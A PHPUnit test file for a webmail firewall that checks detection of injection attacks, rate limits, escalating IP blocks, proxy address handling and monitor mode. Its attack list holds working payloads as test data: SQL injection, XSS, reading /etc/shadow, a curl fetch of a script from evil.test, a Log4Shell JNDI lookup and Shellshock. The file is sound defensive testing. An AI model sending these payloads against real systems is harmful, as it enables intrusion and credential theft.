<?php
declare(strict_types=1);

namespace Webmail\Tests;

use Webmail\Auth;
use Webmail\HttpError;
use Webmail\Waf;

final class WafTest extends TestCase
{
    private int $t;
    private Waf $waf;

    protected function setUp(): void
    {
        parent::setUp();
        $this->t = 1_800_000_000;
        $this->waf = $this->fresh();
    }

    private function fresh(): Waf
    {
        Waf::forget();
        $w = new Waf($this->app);
        $w->clock = fn () => $this->t;
        return $w;
    }

    private const CHROME = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

    private function req(array $query = [], array $over = []): array
    {
        return $over + ['method' => 'GET', 'endpoint' => 'api', 'action' => $query['a'] ?? 'messages', 'query' => $query + ['a' => 'messages'],
            'headers' => ['user-agent' => self::CHROME, 'accept-language' => 'en-GB,en;q=0.9', 'referer' => 'https://mail.acme.test/?a=x&id=5&q=union select'],
            'path_info' => '', 'uri' => '/api.php', 'body' => [], 'origin' => 'https://mail.acme.test', 'host_origin' => 'https://mail.acme.test', 'signed_in' => true];
    }

    private function rules(array $r): array
    {
        return array_column(Waf::inspect($r), 'rule');
    }

    public function testAttacksAreFound(): void
    {
        $attacks = [
            'sqli' => ["5 UNION SELECT password FROM wm_users", "1' OR '1'='1", "inbox' AND 1=1-- ", "1 or 1=1", "1;DROP TABLE wm_users", "1 AND SLEEP(5)",
                "x' AND extractvalue(1,concat(0x7e,version()))", "1 union/**/all/**/select 1,2", "admin'--", "1%27%20OR%20%271%27%3D%271"],
            'xss' => ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(document.cookie)', '<svg/onload=alert(1)>', '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
                '&lt;script&gt;x&lt;/script&gt;', '<iframe srcdoc="x">'],
            'traversal' => ['../../../../etc/passwd', '..%2f..%2fconfig.php', 'php://filter/convert.base64-encode/resource=config.php', '/proc/self/environ', '.env', '....//....//etc/hosts'],
            'command' => ['; cat /etc/shadow', '| whoami', '$(curl http://evil.test/x.sh)', '`id`', 'system("id")', '<?php echo 1; ?>'],
            'php_object' => ['O:8:"stdClass":1:{s:1:"a";s:1:"b";}'],
            'template' => ['{{7*7}}', '${7*7}'],
        ];
        foreach ($attacks as $rule => $list) {
            foreach ($list as $v) {
                $this->assertContains($rule, $this->rules($this->req(['folder' => $v])), "$rule: $v");
            }
        }
        // In headers.
        $this->assertContains('log4shell', $this->rules($this->req([], ['headers' => ['user-agent' => '${jndi:ldap://evil.test/a}']])));
        $this->assertContains('log4shell', $this->rules($this->req([], ['headers' => ['user-agent' => self::CHROME, 'x-api-version' => '${${::-j}${::-n}${::-d}${::-i}:rmi://x/y}']])));
        $this->assertContains('shellshock', $this->rules($this->req([], ['headers' => ['user-agent' => '() { :; }; /bin/bash -c id']])));
        $this->assertContains('scanner', $this->rules($this->req([], ['headers' => ['user-agent' => 'sqlmap/1.7.2#stable (https://sqlmap.org)']])));
        $this->assertContains('scanner', $this->rules($this->req([], ['headers' => ['user-agent' => 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))']])));
        // In a sign-in's email.
        $this->assertContains('sqli', $this->rules($this->req(['a' => 'login'], ['method' => 'POST', 'body' => ['email' => "admin@x.test' OR 1=1-- "]])));
        // The request's shape.
        $this->assertContains('method', $this->rules($this->req([], ['method' => 'PUT'])));
        $this->assertContains('method', $this->rules($this->req([], ['endpoint' => 'page', 'method' => 'POST'])));
        $this->assertContains('bad_action', $this->rules($this->req(['a' => '../config'])));
        $this->assertContains('path_probe', $this->rules($this->req([], ['path_info' => '/wp-login.php'])));
        $this->assertContains('oversize', $this->rules($this->req([], ['uri' => str_repeat('a', 5000)])));
        $this->assertContains('null_byte', $this->rules($this->req(['id' => "5\0"])));
        $this->assertContains('crlf', $this->rules($this->req(['folder' => "inbox\r\nSet-Cookie: x=1"])));
        // Another site posting here.
        $this->assertContains('cross_site', $this->rules($this->req([], ['method' => 'POST', 'headers' => ['user-agent' => self::CHROME, 'origin' => 'https://evil.test']])));
    }

    public function testOrdinaryUseIsLeftAlone(): void
    {
        $ordinary = [
            ['a' => 'messages', 'folder' => 'inbox', 'page' => '2', 'mailbox' => '3', 'starred' => '', 'team' => 'mine', 'label' => '0'],
            // People search for anything: even code and SQL.
            ['a' => 'messages', 'q' => "union select <script> ../../etc/passwd O'Brien 1=1"],
            ['a' => 'calendar/events', 'from' => '2026-11-08T23:00:00.000Z', 'to' => '2026-11-15T23:00:00.000Z'],
            ['a' => 'body', 'id' => '1042', 'images' => '1'], ['a' => 'attachment', 'id' => '7'], ['a' => 'customer', 'id' => '55'],
            ['a' => 'calendar/export', 'id' => '3'], ['a' => 'admin/users/sessions', 'id' => '2'], ['a' => 'message', 'id' => '9', 'peek' => '1'],
        ];
        foreach ($ordinary as $q) {
            $this->assertSame([], $this->rules($this->req($q)), json_encode($q));
        }
        $browsers = [self::CHROME, 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'];
        foreach ($browsers as $ua) {
            $this->assertSame([], $this->rules($this->req([], ['headers' => ['user-agent' => $ua, 'accept-language' => 'en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7']])), $ua);
        }
        foreach (["o'brien@example.com", 'jane.d+news@sub.example.co.uk', "d'orsay@example.fr"] as $email) {
            $this->assertSame([], $this->rules($this->req(['a' => 'login'], ['method' => 'POST', 'body' => ['email' => $email, 'code' => '123456']])), $email);
        }
        // Its own pages posting, at its address or the one it was reached at (www.), or a CRM with a key (no browser).
        $this->assertSame([], $this->rules($this->req([], ['method' => 'POST', 'headers' => ['user-agent' => self::CHROME, 'origin' => 'https://mail.acme.test']])));
        $this->assertSame([], $this->rules($this->req([], ['method' => 'POST', 'host_origin' => 'https://www.acme.test', 'headers' => ['user-agent' => self::CHROME, 'origin' => 'https://www.acme.test']])));
        $this->assertSame([], $this->rules($this->req(['a' => 'data-requests'], ['method' => 'POST', 'headers' => ['user-agent' => 'python-requests/2.32']])));
        // A calendar app reading its feed.
        $this->assertSame([], $this->rules($this->req(['t' => 'Abc123_-xyzAbc123_-xyzAbc123_-xy'], ['endpoint' => 'feed', 'action' => '', 'headers' => ['user-agent' => 'Google-Calendar-Importer']])));
    }

    public function testTheVisitorsAddressBehindAProxy(): void
    {
        $server = ['REMOTE_ADDR' => '162.158.12.3', 'HTTP_CF_CONNECTING_IP' => '203.0.113.9', 'HTTP_X_FORWARDED_FOR' => '6.6.6.6, 203.0.113.9'];
        $this->assertSame('162.158.12.3', Waf::resolveIp($server, ['proxy' => 'direct']));
        $this->assertSame('203.0.113.9', Waf::resolveIp($server, ['proxy' => 'cloudflare']));
        // Not from Cloudflare: its header could be anyone's.
        $this->assertSame('198.51.100.4', Waf::resolveIp(['REMOTE_ADDR' => '198.51.100.4', 'HTTP_CF_CONNECTING_IP' => '203.0.113.9'], ['proxy' => 'cloudflare']));
        // Another proxy: the last address that isn't its own (the ones before it can be made up).
        $this->assertSame('203.0.113.9', Waf::resolveIp(['REMOTE_ADDR' => '10.0.0.2', 'HTTP_X_FORWARDED_FOR' => '6.6.6.6, 203.0.113.9, 10.0.0.5'],
            ['proxy' => 'custom', 'proxy_ranges' => ['10.0.0.0/8']]));
        $this->assertSame('192.0.2.1', Waf::resolveIp(['REMOTE_ADDR' => '192.0.2.1', 'HTTP_X_FORWARDED_FOR' => '6.6.6.6'], ['proxy' => 'custom', 'proxy_ranges' => ['10.0.0.0/8']]));
    }

    public function testScoresBlocksAndLongerBlocks(): void
    {
        $ip = '203.0.113.66';
        $attack = $this->req(['folder' => "1' OR '1'='1"], ['signed_in' => false]);
        // Each attack is refused; the third (5 + 5 + 5) blocks the address.
        foreach ([1, 2] as $i) {
            $v = $this->waf->judge($ip, $attack);
            $this->assertSame([403, 'firewall'], [$v[0], $v[1]]);
            $this->assertMatchesRegularExpression('/^W\d+$/', $v[4]);
        }
        $this->assertSame(403, $this->waf->judge($ip, $attack)[0]);
        $v = $this->waf->judge($ip, $this->req());
        $this->assertSame(['blocked', 900], [$v[1], $v[3]], 'blocked for 15 minutes, even for an innocent request');
        $this->assertNull($this->waf->judge('203.0.113.67', $this->req()), 'not its neighbour');
        // Back after the block, and at it again: an hour, then a day.
        $this->t += 901;
        $this->assertNull($this->waf->judge($ip, $this->req()));
        foreach ([1, 2, 3] as $i) {
            $this->waf->judge($ip, $attack);
        }
        $this->assertSame(3600, $this->waf->judge($ip, $this->req())[3]);
        $this->t += 3601;
        foreach ([1, 2, 3] as $i) {
            $this->waf->judge($ip, $attack);
        }
        $this->assertSame(86400, $this->waf->judge($ip, $this->req())[3]);
        // Unblocked by an administrator: forgiven.
        $this->waf->unblock($ip);
        $this->assertNull($this->waf->judge($ip, $this->req()));
        // A score fades after an hour.
        $this->waf->judge('198.51.100.20', $attack);
        $this->waf->judge('198.51.100.20', $attack);
        $this->t += 3700;
        $this->waf->judge('198.51.100.20', $attack);
        $this->assertNull($this->waf->judge('198.51.100.20', $this->req()), '10 then 5 an hour apart: not blocked');

        $this->waf->block('192.0.2.99', 3600, 'Blocked by Ada', true);
        $status = $this->waf->status();
        $this->assertSame(1, $status['stats']['blocked_now']);
        $this->assertSame(['192.0.2.99', true], [$status['blocked'][0]['ip'], $status['blocked'][0]['manual']]);
        $this->assertContains('sqli', array_column($status['rules_24h'], 'rule'));
        $this->assertCount(3, array_filter($status['events'], fn ($e) => $e['ip'] === $ip && $e['action'] === 'banned'), 'three blocks, logged');
    }

    public function testFailedSignInsAddUp(): void
    {
        $ip = '203.0.113.80';
        for ($i = 0; $i < 14; $i++) {
            $this->waf->penalise($ip, 'failed_invalid_login', 1, $this->req(['a' => 'login']), 'Wrong email or password');
        }
        $this->assertNull($this->waf->judge($ip, $this->req()));
        $this->waf->penalise($ip, 'failed_invalid_login', 1, $this->req(['a' => 'login']), 'Wrong email or password');
        $this->assertSame('blocked', $this->waf->judge($ip, $this->req())[1]);
    }

    public function testRateLimits(): void
    {
        $ip = '203.0.113.90';
        for ($i = 0; $i < 60; $i++) {
            $this->assertNull($this->waf->judge($ip, $this->req([], ['signed_in' => false])));
        }
        $v = $this->waf->judge($ip, $this->req([], ['signed_in' => false]));
        $this->assertSame([429, 60], [$v[0], $v[3]]);
        // Signed in: more allowed. Next minute: counting again.
        $this->assertNull($this->waf->judge($ip, $this->req()));
        $this->t += 60;
        $this->assertNull($this->waf->judge($ip, $this->req([], ['signed_in' => false])));
    }

    public function testNeverBlockedAndMonitorMode(): void
    {
        $attack = $this->req(['folder' => '<script>alert(1)</script>']);
        // On the allow list: never refused for its score, never blocked.
        $this->waf->save(['allow' => '198.51.100.0/24'], '192.0.2.1');
        $w = $this->fresh();
        foreach ([1, 2, 3, 4] as $i) {
            $w->judge('198.51.100.7', $attack);
        }
        $this->assertSame(0, (int) $this->app->db->value("SELECT COUNT(*) FROM {waf_ips} WHERE ip = '198.51.100.7'"));
        // Where an administrator is signed in.
        $admin = (new Auth($this->app))->createUser('ada@acme.test', 'Ada', 'correct horse battery', 'admin');
        $this->app->db->run('INSERT INTO {sessions} (id_hash, data_enc, updated_at, user_id, ip) VALUES (?, ?, ?, ?, ?)', [str_repeat('a', 64), 'x', $this->t, $admin, '192.0.2.50']);
        foreach ([1, 2, 3, 4] as $i) {
            $w->judge('192.0.2.50', $attack);
        }
        $this->assertNull($w->judge('192.0.2.50', $this->req()), "the administrator's office isn't blocked");
        // Monitor mode: logged, nothing refused.
        $w->save(['mode' => 'monitor'], '192.0.2.1');
        $w = $this->fresh();
        foreach ([1, 2, 3, 4] as $i) {
            $this->assertNull($w->judge('203.0.113.5', $attack));
        }
        $this->assertSame(4, (int) $this->app->db->value("SELECT COUNT(*) FROM {waf_events} WHERE ip = '203.0.113.5' AND action = 'logged'"));
        // The block list; and you can't put yourself on it.
        $w->save(['mode' => 'block', 'deny' => '6.6.6.0/24'], '192.0.2.1');
        $w = $this->fresh();
        $this->assertSame('blocked', $w->judge('6.6.6.6', $this->req())[1]);
        try {
            $w->save(['deny' => '192.0.2.0/24'], '192.0.2.1');
            $this->fail('blocked yourself');
        } catch (HttpError $e) {
            $this->assertSame('locks_you_out', $e->errorCode);
        }
        // Off: nothing at all.
        $w->save(['mode' => 'off'], '192.0.2.1');
        $w = $this->fresh();
        $w->guard('api');
        $this->assertNull($w->penalise('203.0.113.5', 'x', 5, $attack, 'x'));
    }

    public function testCleanup(): void
    {
        $this->waf->judge('203.0.113.1', $this->req(['folder' => '<script>']));
        $this->t += 31 * 86400;
        $this->waf->cleanup();
        $this->assertSame(0, (int) $this->app->db->value('SELECT COUNT(*) FROM {waf_events}'));
        $this->assertSame(0, (int) $this->app->db->value('SELECT COUNT(*) FROM {waf_rate}'));
        $this->assertSame(0, (int) $this->app->db->value('SELECT COUNT(*) FROM {waf_ips}'));
    }
}
